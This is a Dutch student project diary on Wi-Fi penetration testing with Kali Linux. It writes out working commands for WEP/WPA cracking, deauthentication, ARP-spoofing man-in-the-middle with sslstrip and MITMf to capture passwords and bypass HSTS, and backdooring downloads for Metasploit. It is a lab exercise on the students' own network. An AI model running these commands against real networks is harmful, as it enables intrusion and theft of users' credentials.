# PenPI 2
* Tinne Van den Abbeele
* Brecht Carlier


## Inleiding

In ons derde jaar op AP Hogeschool wordt er van ons verwacht een 'Security' gerelateerde opdracht te maken. Wij maken deze in groep van twee. Het doel van dit project is dat onze kennis wordt getest en dat we op zelfstandige basis een project kunnen uitvoeren.

In ons project hebben we een aantal doelstellingen. Een zeer belangrijke hiervan is het plannen en het verdelen van taken. We werken in een groep van twee. Hier moet zeker de nodige planning gebeuren willen we tot een succesvolle project komen. We leren hier bepaalde technieken voor die ons hierbij kunnen helpen, GIT is hier het couranste voorbeeld! In ons latere leven zullen we hier ook mee te maken krijgen. We zullen ook vindingrijk moeten zijn bij het oplossen van problemen. Niet alles gaat van de eerste keer en we zullen zeker eens een probleem hebben en dat moeten we succesvol kunnen oplossen. Dit zal tevens belangrijk zijn in ons dagelijks leven. Onze werkhouding en ons gedrag binnen de groep en tegenover derden is ook een belangrijke doelstelling!

Het algemeen doel van ons project is dat we in een werkelijke situatie ervaring opdoen. In dit dossier vindt u de schriftelijke neerslag van en de extra informatie van onze taken. De structuur is te vergelijken met een dagboek, per dag zetten we erop wat we gedaan hebben en wat we nog gaan doen

Wij wensen jullie nog veel leesplezier in ons portfolio.

Brecht Carlier en Tinne Van den Abbeele

## Opdracht
De opdracht is om door middel van een Raspberry Pi draadloze netwerken te hacken. We moesten WPA kraken, paswoord sniffing doen en andere zaken die we zelf mochten kiezen en uitbreiden (pentetration testing).
De bedoeling van dit project was eigenlijk dat we verder werkten aan het project van vorig jaar. Wij hebben samen gekozen om dit niet te doen en van 0 terug te beginnen. Zo leeren we het meest. Een WiFi script kopiëren kan iedereen, er een bouwen en snappen is al veel moeilijker!

# 19/11/2015

**Research**

- Verslag van vorig jaar gelezen
- Penetration testing plural sight [Link](https://app.pluralsight.com/library/courses/kali-linux-penetration-testing-ethical-hacking/table-of-contents)
- Aircrack-ng main tool voor het kraken van WLAN wachtwoorden!

#### Volgende keer:
- RaspberryPi klaarmaken met KaliOS op
- Films zien op Pluralsight -> Penetration testing (Gus Khawaja)
	- Wi-fi Penetration Testing
	- Network sniffing

# 25/11/2015

Een paar voorbereidingen gedaan
- KaliOS op RaspBerry PI2 geïnstalleerd
- Updated KaliOS
- SSH geconfigureerd
- eth0 geconfigureerd met static ip
- Een oude router terug tot leven gebracht om er wat mee te spelen. 
  - WLAN geconfigureerd => SSID (TinneBrecht) WEP (cisco)
  - Onnodige dingen uitgeschakeld (Belgacom TV VLAN, ADSL settings ...)


##Wat hebben we geleerd?
Hoe SSH op te stellen: [LINK] (http://www.blackmoreops.com/2014/06/19/kali-linux-remote-ssh/) </br>
Hoe te veranderen van DHCP naar statisch ip: [LINK](http://solutionsatexperts.com/ip-address-configuration-in-kali-linux/) </br>
Hoe een netwerk interface uit te schakelen: [LINK](http://superuser.com/a/924715)

# 27/11/2015

We hebben wifi voor de eerste keer gehacked!

![FOTO](http://i.imgur.com/PP0AThP.png)

We hebben ons WEP wachtwoord succesvol kunnen kraken.
Hiervoor hebben we ee tutorial op Pluralsight gevolgd.

We hebben gebruik gemaakt van een Alfa die beschikbaar is op school.

## Stappen/Commando's

### Wireless Reconnaissance:

Dit wordt gebruikt om op 'verkenning' te gaan.(reconnaissance). Deze stap geeft het doel acces point weer en laat alle andere draadloze netwerken zien die impact kunnen hebben op je acties.

**Window 1**

Om te beginnen gaan we de draadloze interfaces vaststellen. Deze draadloze interfaces gaan we in moniroting mode instellen. Daarna lijsten we de draadloze netwerken op die binnen onze range zitten.

> iwconfig
> airmon-ng start wlan0
> airodump-ng "INTERFACE"
> Find information in table
> - ESSID
> - BSSID
> - Channel>> Client's  MAC

###Wireless Equivalent Privacy(WEP):

WEP werd later vervangen door het wifi protected acces wpa protocol. 1 van de voornaamste tekortkomingen van WEP werd als eerste erkend bij het hergebruiken van de initialisatie vector(IV). IV WEP berust op het RC4 coderingsalgoritme, dat gekend is als stream cipher. In dit cijfer kan dezelfde encryptie sleutel niet worden herhaald. IV's werden ingevoerd om de wacht te houden tegen het hergebruiken van sleutels. Dit door een element van willekeur in de versleutelde gegevens in te voeren. Helaas is een 24bit IV te kort om herhaling volledig te voorkomen.

De meeste WEP sleutels kunnen hersteld of gekraakt worden binnen de 3 minuten.

**Window 1**

Om de hack te laten werken hebben we bepaalde informatie nodig over het doelwit. Eerst en vooral hebben we de BSSID nodig. Dit wil zeggen dat we de naam van het draadloos netwerk gaan identificeren. Daarna gaan we kijken naar het mac adres van het access punt. We moeten ook nagaan welk draadloos kanaal er gebruikt wordt (bv:eth0). Als laatste hebben we het mac adres nodig van de draaloze client.
> airmon-ng
> - Find "INTERFACE"

> airodump-ng "INTERFACE"
> Find information in table

**New window 2**

Het commando *airodump-ng* wordt gebruikt om draadloos verkeer te sniffen en IV's te verzamelen. De *--bssid* en *-c* delen van dit commando geven aan waar je de informatie die we daarnet opgezocht hebben(BSSID en channel)moet plaatsen. De *-w* is voorzien om de naam van de output file neer te schrijven. Nu moeten we het aantal overgedragen IV packetjes laten toenemen. Na het uitvoeren van dit commando mag het venster absoluut niet gesloten worden.
> airodump-ng --bssid "BSSID" -c "Channel" -w wep_log "INTERFACE"

**New window 3**

Deze commando's worden gebruikt om het mac adres van eigen computer(attacker) te vinden.
> ifconfig </br>
> Find own MAC

**New window 4**

De *-1* die we ingeven signaleert een nep-authenticatie. De *0* die daarop volgt geeft de reassociation timing weer. De *--ignore-negative-one* die we aan het einde van ons commando schrijven negeert de negatieve -1 channel van monitor 0. Met de vals gezette authenticatie zullen we verkeer genereren dat van een vertrouwd mac adres komt en doorgestuurd wordt naar het target wireless access punt. We maken opnieuw gebruik van het *aireplay-ng* commando om de klus te klaren. Deze aanval is gekent als een arp injectie of arp replay attack. Het voormalige target acces punt zal de arp packetten heruitzenden(broadcast).
> aireplay-ng -1 0 -a "BSSID" -h "client MAC" -e "name connection" "INTERFACE" --ignore-negative-one
> aireplay-ng -3 -b "BSSID" -h "client MAC" "INTERFACE" --ignore-negative-one

**New window 5**

In dit scherm gaan we aanpasbare pakketten genereren. De *-2* duid erop dat we de interactieve packet replay gebruiken. De *-p* die daarop volgt zet het frame cotrole veld van het packet zo dat het lijkt alsof het van een draadloze client komt. Om de bestemming zo in te stellen dat de packetten verzonden worden naar alle hosts van het netwerk word het *-c FF:FF:FF:FF:FF:FF* deel in het commando gebruikt. Achter *-b* zetten we het mac adres van de bssid en achter *-h* zetten we het mac adres van de machine van de aanvaller.
> aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "BSSID" -h "client MAC" "INTERFACE" --ignore-negative-one
> Use this packet? ENTER

**Window 2**

Na al deze acties gaan we terug naar het 2de scherm dat we opengedaan hebben. Het scherm waarbij vermeld werd dat het niet gesloten mocht worden. Op dit scherm gaan we nu kijken naar de hoeveelheid data. Als dit veld een waarde geeft van boven 5000 mogen alle schermen die nog open staan gesloten worden.
> Everything is fine if data is above 5000
> Close window 2, 3, 4, 5

**First window**

Nu komen we terug op het eerste scherm terecht. We gebruiken het commando clear om even heel snel ons scherm leeg te maken. Het volgende *aircrack-ng* commando kan gebruikt worden om de web key te kraken. In dit commando geven we *-a* in direct gevolgd door nummer *1*. Dit deel forceert de attack mode om 'static WEP' te zijn. De 64 die in dit commando voorkomt wil zeggen dan de key 64 bits gebruikt. *wep_log-01.cap* wjst op het bestand waar de gevangen id in zit. Het eerste deel hiervan voor -O1 hebben we zelf in het begin ingesteld.
> clear
> aircrack-ng -a 1 -b "BSSID" -n 64 wep_log-01.cap

**_PASWOORD GEVONDEN!!!!_**
</br>

**Problemen**

De eerste keer werkt het niet. Dit kwam doordat er niemand verbonden was met onze Wifi (TinneBrecht). Om ervoor te zorgen dat de hack lukt, moet er minstens één host geconnecteerd zijn, om deze reden dat we verkeer nodig hebben binnen ons netwerk. Hoe meer verkeer, hoe makkelijker we de IV's kunnen kraken. Wanneer er iemand op het netwerk is zullen wij (attacker) zijn MAC address spoofen om ervoor te zorgen dat het acces punt denkt dat we de computer(host) zijn. nu kunnen we ook pakketten verzenden naar het acces punt om de hack te versnellen.

Bronnen:
- Pluralsight video
- [LINK](http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wep-passwords-with-aircrack-ng-0147340/)

Volgende keer:
- Script schrijven!
- Ethercap opzoeken (Hoe wachtwoorden "vangen" !?) -> Man in the middle attack

# 7/12/2015

- TightVNC server geïnstalleerd op de Raspberry PI!</br> Dit kan handig zijn wanneer we de GUI nodig hebben. Ook handig wanneer we geen extra scherm ter beschikking hebben. Wat op school 99% van de tijd het geval is. Op te starten met tightvncserver. Het passwoord is ciscocisco. </br> VNC is een methode om het bureablad van een remote computer (via het netwerk verbonden) te delen. We kunnen ook onze muis en toestenbord bedienen van de host via je client! VNC is een open 'protocol' en er bestaan zeer veel clients. Omdat wij op de RPi gebruik maakten van TightVNC, doen we dit ook op onze Windows computer (uiteraard dan de client versie).

- Een paar WEP cracking scripts opgezocht ter inspiratie. ([LINK](http://www.itsecurenet.com/crack-wifi-wep-password-script-backtrack/))

### Wat hebben we geleerd?

- Een script executable maken = chmod +x yolo.sh
- if moet eindigen met fi in bash script
- Bash script debugging sucks like hell
- $1, eerste argument na script naam => yolo.sh wlan1 => $1 == wlan1
- Met '&' begint het proces op de achtergrond, zo kan je de shell blijven gebruiken en hoef je niet te wachten tot het script klaar is. Zo kunnen we dus meerdere scripts tegelijk runnen!

# 10/12/2015

## Steps/Commands

### **WPA**
WiFi Protected Access (WPA) is een draadloos beveiligingsprotocol die bedoeld is om de veiligheids tekortkomingen van WEP ‘op te lossen’. Doordat de WPA protocollen dynamisch voor elk pakketje een nieuwe sleutel genereren, voorkomen ze de statische analyse die ervoor zorgde dat WEP faalde.
WPA wordt vaak ingezet met een vooraf gedeelde sleutel (PreShared Key (PSK)) om de communicatie tussen het acces punt en de draadloze clients te beveiligen. De PSK moet een willekeurige zin zijn van ten minste 13 tekens lang. Zo niet, dan is het mogelijk om de PSK te bepalen door een brute force attack uit te voeren. Dit gebeurt door de PSK te vergelijken met een gekende woordenboek. WPA1 was een noodoplossing voor WEP, WPA moest werken op dezelfde hardware als WEP toestellen. Later is  WPA2 volledig doorgebroken, dit heeft betere beveiling maar is niet meer compatibel met de oudere hardware!

**Venster 1**
De eerste stap is om een monitor interface te creëren met behulp van het *airmon-ng* commando. Monitor interface betekend dat hij de pakketjes die niet voor hem bestemt zijn toch zal deencapsuleren. Nu kun je dus de data van heel het draadloos netwerk zijn! Voordat u de monitor interface mode start moet de netwerkbeheerder service stopgezet worden. Nu kunnen we beginnen. het *airodump-ng* commando zal alle beschikbare toegangspunten in zijn range oplijsten. Wanneer u uw doelgroep gevonden hebt stop je de actie door *ctrl+c* te doen.
De *--showack* is er om ervoor te zorgen dat de client computer jouw verzoek bevestigd.  Het *-w* argument is om de output weg te schrijven naar een file. Open een ander scherm maar sluit dit scherm nog niet. 
> service network-manager stop
> airmon-ng start "INTERFACE"
> airodump-ng mon0
> airodump-ng --bssid "BSSID" -c "Channel" --showack -w wpa_log "INTERFACE"


**Nieuw venster**
In dit venster zullen we een de-authenticatie aanval lanceren. Deze aanval zal de gebruiker dwingen zich opnieuw te authentiseren (connecteert automatisch -> windows default settings) naar het doel acces punt en om de WPA sleutel opnieuw uit te wisselen. We maken gebruik van *airplay-ng* voor de de-authenticatie aanval. *0* geeft aan dat we een de-authenticatie aanval lanceren. *20* geeft aan dat we 20 de-authenticatie pakketjes versturen. De *-a* en *-c* zijn de BSSID en het cliënt mac adres.
Wanneer we terug gaan naar ons eerste scherm kunnen we zien da er een 4 way handshake is vastgelegd. Deze handshake toont zich in de rechte boven hoek van he scherm (“WPA handshake”).
Zodra we deze handshake hebben, kunnen we beginnen met kraken. We zullen de *aircrack-ng* gebruiken om de WPA-sleutel met behulp van een gedefinieerde woordenlijst te kraken (bruteforce).

> aireplay-ng -0 20 -a "BSSID" -c "HOSTMAC" "INTERFACE"
> Ctrl + c
> Clear
> aircrack-ng wpa_log-01.cap -w "path to wordlist"

* ***"wpa_log-01.cap"*** = Logbestand waar airodump elk packetje in zet. Deze naam kan gewijzigd worden met het *-w* commando.
* ***"path to wordlist"*** = WPA heeft de zwakte met IV’s niet zoals WEP ze heeft (zie theorie). Daarom moeten we het wachtwoord bruteforcen. De woordenlijst is een tekstbestand met mogelijkheden (veelvoorkomende wachtwoorden). Een voorbeeld is [rockyou](http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt)

### Some comments

We hebben dit niet gedaan met onze RPi2 om volgende redenen:
* De hardware is te traag voor bruteforcing
* Het duurde een eeuwigheid om het ‘rockyou’ file te downloaden op school
* Bruteforcing is redelijk zinloos met een “random” gegenereerd passwoord. Tegenwoordig is dit standaard (duurt te lang).
Bruteforcing kan versneld worden door de GPU power te gebruiken.

# 17/12/2015

*Nieuwe oplossing voor netwerk te simuleren
Linksys E4200 gebruikt, deze heeft een ethernet WAN poort. Krijgt internet via Windows PC (Internet delen). PC is dus DHCP server + Router. [LINK](http://windows.microsoft.com/nl-be/windows/using-internet-connection-sharing#1TC=windows-7).*

Indien WiFi niet nodig is, kunnen we ook gewoon een switch verbinden met de laptop, zo simuleren we een thuis netwerk en hebben onze hosts internet.

NOOT: Dit is niet mogelijk met mijn zwarte Phillips router omdat deze enkel beschikt over een ADSL WAN poort.

NOOT2: Later (14/01/2016) zal blijken dat mijn thuis router (E4200) niet te kraken valt via ons WiFi script. Deze veel recentere router 'deauth' onze hacker constant. Waarschijnlijk omdat we zoveel ARP pakken sturen. Hierdoor duurt het véél langer voor je voldoende data hebt om het wachtwoord te kraken!

Raspberry Pi 2 is niet beschikbaar. Geheugen kaart is kapot (voor de 2de keer...). 
Ik had ook niet de mogelijkheid om Kali opnieuw op de SD kaart te zetten. Geen microsd kaart naar normale sdcard adapter meegenomen...

We hebben nog geprobeerd het te redden, maar bestandsysteem was corrupt. We hadden al veel tijd verloren dus besluiten we de RPi voorlopig even op zij te leggen.

**Virtual box (alternatief)**
* Kali op virtual box opgestart.
* Virtualbox geconfigureerd om met Alfa te kunnen werken! (USB passtrough)
* 'airmon-ng start wlan0' werkte niet -> opgelost door manueel in monitor te zetten. [Link](https://taufanlubis.wordpress.com/2010/05/14/how-to-fix-ioctlsiocsiwmode-failed-device-or-resource-busy-problem/)

Eigen script weeral getest, werkt zogoed als altijd met Alfa van het school. Nog steeds niet altijd. Enorm veel tijd verspild met automatisatie script!

Conclusie van vandaag. Veel tijd verspild, RPi stuk, WiFi script werkt soms wel soms niet (random). We weten niet goed waarom?? We hebben hier 5u achter gezocht, debuggen in bash is niet onze beste vaardigheid...

#28/12/2015

Vandaag was ons doel om een MiTM (Man In The Middle) aanval uit te voeren.

We bevinden ons al in het netwerk, want we hebben het WiFi wachtwoord gehackt. We zouden graag weten wat eeen host (victim) allemaal doet op het internet, en we zouden graag de wachtwoorden willen stelen!

####Hoe doen we dit?

We zullen aan ARP spoofing doen, hierbij zullen wij ARP pakketjes sturen naar ons slachteroffer met de mededeling wij zijn de gateway naar het internet aka de router. Er is geen beveiling op ARP pakketjes (authenicatie), de computer zal ons dus geloven. En zal telkens hij iets wilt sturen naar het internet (uploaden, POST), dit sturen naar onze computer (Hacker). Natuurlijk zou het opvallen mochten wij uitendelijk de pakketjes niet doorsturen naar de echte gateway, er zou dan immers geen internetverbinding zijn. We lossen dit op door ARP pakketjes te sturen naar de "echte" gateway met als boodschap dat wij (hacker) de hostcomputer zijn (victim). Dit heeft als gevolg elke keer de router een pakketje heeft voor de host (downloaden, GET), hij het zal sturen naar de onze computer (hacker).

![Topologie](http://www.windowsecurity.com/img/upl/image0031268491809957.jpg)

We kunnen nu perfect al het verkeer afluisteren, en hebben sucessvol een MiTM gedaan!

###Man In The Middle attack without Ettercap

[SOURCE](https://www.youtube.com/watch?v=Vvln4_HfIVg)

IP Forward & IPTables
* IP Forward is standaard uitgeschakeld bij Linux systemen. Zoals de naam zegt zorgt dit ervoor dat je geen IP verkeer kunt doorsleuzen. Deze functie moet je opzetten wil je en router / vpn maken van je computer. Wij moeten deze ook opzetten willen een MITM aanval doen. We moeten immers als router (default gateway) spelen in het netwerk. Het gevraagde netwerk zullen wij doorsturen naar de juiste plaas maar onder tussen bekijken we deze data!
* IPTables: Standaard firewall Linux. We moeten hier nog in stellen dat het verkeer doorgezonden mag worden! </br> 
  
De commando's hier voor zijn:
> echo 1 > /proc/sys/net/ipv4/ip_forward </br>
> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to port 8080

Installeren van arpspoof (dsniff)
* Tool voor het sturen van onze valse ARP pakketjes
* apt-get install dsniff

Installing sslstrip
* Zorgt ervoor dat https request omgezet worden in gewone http request (onversleuteld), zo kunnen we nog steeds kijken wat de vicitim verstuurd!
* [LINK](http://blog.petrilopia.net/linux/raspberry-pi-install-sslstrip/)

No module twisted web found
* apt-get install python-twisted-web

De originele default gateway vinden
* route -n

Mac address van de default gaateway (192.168.137.1) is dezelfde als onze Raspberry Pi2 (hacker). 

![FOTO](http://i.imgur.com/x5ZWnHw.png)

####Probleem HSTS
HSTS is een maatregel om HTTPS beter uit de verf te laten komen. Het zorgt ervoor dat sites enkel bezoekbaar zijn via HTTPS. Dit zorgt dat het onmogelijk is om het verkeer af te luisteren, of om de cookies te hacken (zie OWASP).

In het begin was dit een server gebeuren, door een http header wist de computer (browser) ik moet dit via HTTPS bezoeken. Indien je een succesvolle MITM hebt gedaan is het niet moeilijk om te manipuleren! Echter sinds kort (+-2014) hebben browsers lijsten van welke site HSTS hebben. Bijvoorbeeld Chrome weet dat facebook.com HSTS aan heeft en dus HTTPS afdwingt. Het zal nooit facebook.com laten zien zonder https. Ze slaan ook certificaat gegevens op zodanig je deze niet kun fakken.

Het wordt nu al een stuk moeilijker om bekende sites via HTTP te bezoeken...

### With Ettercap

#### Config
Bij Ettercap is het iets gemakkelijker om de IPTables in te stellen. Je moet iets uit commentaar zetten. Dit doe je in de config file van Ettercap. Onder het 'hoodfstuk' Linux zullen je de instellingen vinden:

```
#---------------
#     Linux 
#---------------

# if you use ipchains:
   #redir_command_on = "ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
   #redir_command_off = "ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"

# if you use iptables:
   #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
   #redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport" 
```

We gebruiken iptables dus hebben we die 2 lijnen eronder uit commentaar gezet. We moesten ook nog meer prioriteit geven aan Ettercap zelf zodanig het toegang had tot bepaalde files, en bepaalde (admin) gerelateerde zaken (netwerk verkeer lezen, ...)

Dit doen we door 

```
[privs]
ec_uid = 65534                # nobody is the default
ec_gid = 65534                # nobody is the default
```

aan te passen naar (deze staan ergens in het begin van de file):

```
[privs]
ec_uid = 0                # nobody is the default
ec_gid = 0                # nobody is the default
```

De configfile  bevind zich op
> /etc/ettercap/etter.conf

#### Probleem HTTPS + HSTS
Etthercap zal niet zoals bij SSLStrip, https proberen "uiteschakelen". Niet zo'n heel groot probleem. De gebruiker zal een waarschuwing krijgen (rode melding) dat het certificaat niet geldig is en etc. Dit zal op elke https site gebeuren. De gewone gebruiker zal na een tijd geïriteerd geraken en gewoon op "toch doorgaan" klikken. Groot probleem! Ook nu hebben we nog steeds last van het HSTS verhaal...

We zouden dit kunnen oplossen door te testen met een oudere browser (hebben we ook gedaan). Maar we wilden toch van die waarschuwing af! 


###SSLstrip2 + DNS2Proxy
Dezelfde werkwijze als onze eerste poging
* IPTables
* Manueel ARP pakketjes instellen (1ste window => Ik ben de router > Host, 2de windows => Ik ben de host > Router)
* SSLstrip runnen

Verschil bij deze is dat iemand een fork heeft gemaakt van de oorspronkelijke SSLstrip om HSTS te omzeilen. De werking hiervan is zeer simpel. Indien er een site gerequest wordt (dns), zal onze aanvaller de dns request uitvoeren maar tegelijk ook zeggen dat de site verplaatst is. Zo zal indien je naar https:/gooogle.com surft, de aanvaller het juiste ip terug geven maar ook zeggen dat https:/www.google.com verplaatst is naar http:/wwwww.google.com (een w teveel). De browser zal dus nu niet meer denken dat hij op Google zit en zal de HSTS check niet uitvoeren. We hebben succesvol https omzeild!!!

Of dit is de theorie althanks. [De mens](https://github.com/LeonardoNve) die de code gepuliceerd heeft voor sslstrip 2 en DNS2proxy, heeft het offline moeten halen wegens de wet. Maar dankzij GitHub kunnnen we makkelijk forks terug vinden en konden we zo de code achterhalen en binnen halen.

Probleem 1, we moesten iets unzippen op de RPi2. Maar we beschikten niet over een archiveringsprogramma
>apt-get install unzip

Probleem 2, we kregen het niet werkend op de RPi. Het werkte gewoon niet. Omdat het al de zoveelste keer was dat iets niet werkte op RPi en we toch de instructies volgde, hebben we besloten om de RPi op vervroegd pensioen te sturen. Vanaf nu gebruiken we een laptop waarop Kali OS staat. Eigenlijk hadden we dit sneller moeten doen. De problemen die we gahad hebben omdat de RPi iets miste waren talrijk, voornamelijk omdat de ARM build van Kali anders was dan de bekende x86 build...

Op de laptop starten beide programma's op. De DNS2proxy werkte ook, we zagen constant welke site de gebruiker een dns request voor uitvoerde. SSLStrip2 leek ook te werken, tot we HTTPS sites bezochten. Ipv een HSTS waarschuwing kregen we gewoon niets meer, connection timed out.... We staan dus minder ver als 4u terug.


Verkeer onderscheppen:

![FOTO](http://i.imgur.com/DkTBB9v.jpg)

DNS functionaliteit:

![FOTO](http://i.imgur.com/uCBNZT1.jpg)

###MITMF

HSTS omzeild (eerste regel) + Inlog gegevens gehackt
![FOTO](http://i.imgur.com/2JCA5ow.jpg)

![FOTO](http://i.imgur.com/BgeXIaa.jpg)


GEDULD IS EEN MOOIE ZAAK!

Al deze data wordt opgeslagen in een log bestand. We kunnen hierna d.m.v. grep zoeken naar een wachtwoord!

> cd /usr/share/mitmf/logs
> cat mitmf.log | grep pass

Nu zien we alle 'strings' waar 'pass' invoor komt!

![Wachtwoordennnn](http://i.imgur.com/xbf5Bfp.png)

**Got passwords**
* mitmf -i eth0 --target 192.168.137.64 --gateway 192.168.137.1  --arp --spoof --hsts
* 2 spaties voor --arp!!!!!
* [Demo YouTube](https://youtu.be/jGgy2WOmDBo)

**Got images**
* driftnet -b -i eth0
* [Demo YouTube](https://youtu.be/co7Gy-zeeLE)

We hebben dit ook even op een WiFi netwerk getest en dit werkt ook! We hebben vandaag toch een mooie stap gezet! We zijn instaat om een MITM aanval te doen! En we kunnen wachtwoordne 'hacken' op https sites, we kunnen eveens zien welke afbeeldingen het victim download!

# 29/12/2015

Kali OS bevat standaard een versie van MITMf die via apt-get install MITMf geïnstaleerd kan worden.
Volgens de autheur van MITMf loopt deze versie echt wat achter op de laatste patches.

We hadden gisteren af en toe problemen dat MITMf crashte en hoppen dit nu zo op te lossen...
We hebben dus de laatste versie via GitHub gedownload en de [installatie instructies](https://github.com/byt3bl33d3r/MITMf/wiki/Installation) gevolgd.

#### Problemen installatie:
- Kon source /usr/bin/virtualenvwrapper.sh niet vinden </br> Stond op een ander plek op Kali OS (zelfde plek als Ubuntu):   */usr/**local**/bin/virtualenvwrapper.sh* </br>
  [Bron (StackOverflow)](http://stackoverflow.com/questions/12647266/where-is-virtualenvwrapper-sh-after-pip-install)
- Wat is .bashrc? </br> Het doel van een .bashrc bestand is om een plek te voorzien waar je variabelen, functies en aliassen op kan zetten. Bepaal uw prompt en difinieer andere instelling die u wilt gebruiken. Elke start moet er een nieuw terminal scherm geopend worden. Telkens wanneer er een nieuw terminal, raam of venster geopend wordt werkt het. bashrc draait op elke interactieve shell launch.
- Nog allerlij Linux gerelateerde problemen (dependencies die missen, ...)

#### Nieuwe zaken geleerd (CMD) tijdens testen:
- arp -d -a  </br> Alle bestaande ARP gegevens verwijderen
- ipconfig /flushdns </br> DNS cache leegmaken

#### Problemen:
- HSTS omzeilen werkte niet goed bij deze versie. Werkte 5 keer goed en daarna kwamen er enkel nog time-outs...

We hebben besloten hiermee niet verder te gaan aangezien het geen verbetering was. We gebruiken nu dus nog steeds de meegeleverde versie!

Conclusie: Gigantisch gefaald / Tijdverspilling

### Met andere "modes" van MITMf gespeeld.

#### Image rotate (upsidedownternet)
Deze plugin zorgt ervoor dat elke afbeelding die ingeladen wordt 180° geroteerd wordt! Zo staat elke afbeeldingen op zijn kop. </br>
[YoutTube demo](https://www.youtube.com/watch?v=HJ1nn-T98Vk)

#### Screen
Dit zorgde ervoor dat er om de 10s (instelbaar) een printscreen gestuurd wordt van de site die de bezoeker aan het bekijken is. </br>
[YouTube demo](https://www.youtube.com/watch?v=f4zf-_WwTfo)

### JSkeylogger
Deze injecteerde in elke site "kwaadaardige" javascript code die ervoor zorgt dat we "realtime" kunnen zien wat de gebruiker typt in websites. </br>
Voorlopig werkt dit niet, ik weet niet wat er mis is. Ik kan allesinds niet zien wat de gebruiker intypt. Of ik vind niet waar het opgeslagen wordt. Misschien is het opgelost in de nieuwere versie van Mitmf (zie hierbovn). Misschien kijken we hier later nog eens naar.

#### FilePwn
Deze zorgt ervoor dat gedownloade uitvoerbare bestanden  (.exe, .zip, ...) automatisch worden voorzien van een backdoor. Indien de gebruiker het bestand open doet, zouden we via Metasploit toegang hebben tot het apparaat! En kan de pret beginnen.

Gebruikte tuturial [LINK](http://null-byte.wonderhowto.com/how-to/backdooring-fly-with-mitmf-0160383/)

Problemen
- Geen verbindng met Metasploit. </br>
  Mitmf kon geen verbinding maken met Metasploit. Ik was vergeten de RPC server te starten. Deze kun je starten met: </br>
  *load msgrpc Pass=abc123*</br>
  Nu hebben een rpc server draaien met als wachtwoord abc123. Die werkte nog steeds niet. Ik moest de instellingen van MITMf aanpassen   naar de juiste poort. Nu werkte dit wel. Ik ben hierna ook armitage beginnen gebruiken (GUI voor Metasploit). Indien ik hier          hetzelfde wachtwoord en de juiste poort voor de rpc server instelde werkte dit ook!
- Kon payload niet vinden </br>
  We kregen vaak een error als we MITMf opstarte met FilePwn dat hij de payload niet kon vinden. Dit was raar aangezien Metasploit      volledig juist was ingesteld, het was ook random. Ik heb de nieuwe versie van MITMf toch snel even geprobeerd en hier werkte het wel   altijd.
- Kon exe niet updaten (nieuwe versie) </br>
  In de nieuwe versie konden we onze npp.exe (Notepad++) niet "patchen" met onze backdoor. Wat raar was want dit ging wel in onze       originele versie, toen hebben we putty.exe getest. Deze werd wel gepacht met onze backdoor in. Raar...
- Geen meterpreter sessie
  Was uitendelijk alles gelukt, verkregen we maar geen meterpreter sessie in onze Metasploit  / Armitage. Aka onze hacker had geen      verbinding met de victim... Onze backdoor was dus niet gelukt...

TODO: Printscreens!!! </br>
Printscreens kwijt, Kali opnieuw geinstalleerd. Zie volgende log!

Conclusie, niet gelukt...

###Subterfuge
Nadat het dus gefaald was om met MITMf om toegang te verkrijgen tot een computer met onze hackmachine. Zijn we opzoek gegaan naar alternatieven. Subterfuge was er één, deze was een tool waarmee je een server starten en alles kon instellen via je browser. Het zag er zeer belovend uit.

[Tuturial](http://technovortex.blogspot.be/2013/08/getting-meterpreter-session-over-mitm.html)

Het installeren ging tamelijk vlot, het instellen ook. Tot stap 7, vanaf we onze instellingen opslaan, crashte Subterfuge. We kregen constant "Djano" errors (multivaluedictkeyerror, Django “You have unapplied migrations”, ...)

Door hard zoeken hebben we steeds iets kunnen oplossen maar elke keer we iets oplooste ging er iets anders stuk... Op een gegeven moment was ik zo beu dat we deze software over boord gegooigd hebben.

UPDATE, tijdens het schrijven van deze tekst gevonden dat Subterfuge op een oudere versie werkt van Django dan de standaardversie van Kali. Indien we tijd over hebben kunnen we het misschien nog proberen...

Conclusie, niet gelukt!

###Metasploit.

**Wat is metasploit?**</br>
Metasploit Framework is een open source penetration tool dat gebruikt wordt voor het ontwikkelen en uitvoeren van exploit code tegen een externe doelcomputer. Het heeft over heel de wereld de grootste database van openbare, geteste exploits. Om het simpel uit te drukken kan metasploit gebruikt worden om de kwetsbaarheid van computersystemen te testen. Enerzijds om ze te kunnen beschermen en anderzijds om om in te kunnen breken in externe systemen. Metasploit is een krachtig instrument dat wordt gebruikt voor penetration testing. Met metasploit leren werken heeft veel inspanning gaat niet op 1 dag en heeft tijd nodig.

**In de praktijk**</br>
Na alle tools die zogegd mijn leven makkelijker moeten maken en zorgen dat ik zelf niet veel Metasploit moet doen, heb ik besloten om het gewoon zelf in Metasploit te doen. Veel had ik niet te verliezen, we hadden immers nog steeds geen succes in een backdoor plaatsen.

Mijn eerste doel was om de ms11_003_ie_css_import exploit te gebruiken. Deze exploit gebruikt een zwakheid in de html render van Internet Explorer. Volledige uitleg:

*"This module exploits a memory corruption vulnerability within Microsoft\'s HTML engine (mshtml). When parsing an HTML page containing a recursive CSS import, a C++ object is deleted and later reused. This leads to arbitrary code execution. This exploit utilizes a combination of heap spraying and the .NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not opt-in to ASLR. As such, this module should be reliable on all Windows versions with .NET 2.0.50727 installed."*

Ik zet deze exploit op een site die ik run om mijn Kali computer (192.168.2.7). Om even snel te testen browse ik manueel naar de server. Wat blijkt dit werkt niet, mijn browser wordt gedecteerd als Firefox browser. Ik vond dit raar, na even snel zoeken vond ik iemand die het had opgelost door IE terug als standaardbrowser in te stellen. Zogezegd zogedaan. Dit loste blijkbaar niets op.

Blijkbaar is de *user-agent* van Internet Explorer al jaren die van Mozilla Firefox om compatibel te zijn...

Neem een kijkje om de user-agent string te zien van IE [Klik hier](http://www.useragentstring.com/pages/Internet%20Explorer/)

